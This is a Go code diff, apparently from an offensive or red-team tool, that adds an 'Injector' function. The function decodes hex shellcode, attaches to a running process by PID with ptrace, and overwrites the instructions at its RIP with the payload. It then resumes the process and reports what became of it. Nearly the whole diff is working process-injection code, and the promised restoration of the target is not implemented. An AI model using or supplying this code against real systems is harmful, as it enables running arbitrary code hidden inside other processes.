@@ -197,6 +197,97 @@ func goShellcodeLoader(shellcode *string) error {
 	return nil
 }
 
+// Injector inject shellcode to a running process using ptrace
+// target process will be restored after shellcode has done its job
+// TODO
+func Injector(pid int, shellcode *string) error {
+	// format
+	*shellcode = strings.Replace(*shellcode, ",", "", -1)
+	*shellcode = strings.Replace(*shellcode, "0x", "", -1)
+	*shellcode = strings.Replace(*shellcode, "\\x", "", -1)
+
+	// decode hex shellcode string
+	sc, err := hex.DecodeString(*shellcode)
+	if err != nil {
+		return fmt.Errorf("Decode shellcode: %v", err)
+	}
+
+	// start a child process to inject shellcode into
+	err = syscall.PtraceAttach(pid)
+	if err != nil {
+		return fmt.Errorf("ptrace attach: %v", err)
+	}
+	log.Printf("Injector: attached to %d", pid)
+
+	// read RIP
+	regs := &syscall.PtraceRegs{}
+	err = syscall.PtraceGetRegs(pid, regs)
+	if err != nil {
+		return fmt.Errorf("read regs from %d: %v", pid, err)
+	}
+	rip := regs.Rip
+	log.Printf("Injector: got RIP (0x%x) of %d", rip, pid)
+
+	// write shellcode to .text section, where RIP is pointing at
+	n, err := syscall.PtracePokeText(pid, uintptr(rip), sc)
+	if err != nil {
+		return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(rip), pid, err)
+	}
+	log.Printf("Injected %d bytes at RIP (0x%x)", n, rip)
+
+	// peek: see if shellcode has got injected
+	peekWord := make([]byte, len(sc))
+	n, err = syscall.PtracePeekText(pid, uintptr(rip), peekWord)
+	if err != nil {
+		return fmt.Errorf("PEEK: 0x%x", rip)
+	}
+	log.Printf("Peeked %d bytes: %x at RIP (0x%x)", n, peekWord, rip)
+
+	// continue and wait
+	err = syscall.PtraceCont(pid, 0)
+	if err != nil {
+		return fmt.Errorf("Continue: %v", err)
+	}
+	var ws syscall.WaitStatus
+	_, err = syscall.Wait4(pid, &ws, 0, nil)
+	if err != nil {
+		return fmt.Errorf("continue: wait4: %v", err)
+	}
+	// what happened to our child?
+	switch {
+	case ws.Continued():
+		return nil
+	case ws.CoreDump():
+		err = syscall.PtraceGetRegs(pid, regs)
+		if err != nil {
+			return fmt.Errorf("read regs from %d: %v", pid, err)
+		}
+		return fmt.Errorf("continue: core dumped: RIP at 0x%x", regs.Rip)
+	case ws.Exited():
+		return nil
+	case ws.Signaled():
+		err = syscall.PtraceGetRegs(pid, regs)
+		if err != nil {
+			return fmt.Errorf("read regs from %d: %v", pid, err)
+		}
+		return fmt.Errorf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), regs.Rip)
+	case ws.Stopped():
+		err = syscall.PtraceGetRegs(pid, regs)
+		if err != nil {
+			return fmt.Errorf("read regs from %d: %v", pid, err)
+		}
+		return fmt.Errorf("continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), regs.Rip)
+	default:
+		err = syscall.PtraceGetRegs(pid, regs)
+		if err != nil {
+			return fmt.Errorf("read regs from %d: %v", pid, err)
+		}
+		log.Printf("continue: RIP at 0x%x", regs.Rip)
+	}
+
+	return nil
+}
+
 // InjectShellcode inject shellcode to a running process using various methods
 func InjectShellcode(pid int, method string) (err error) {
 	// prepare the shellcode
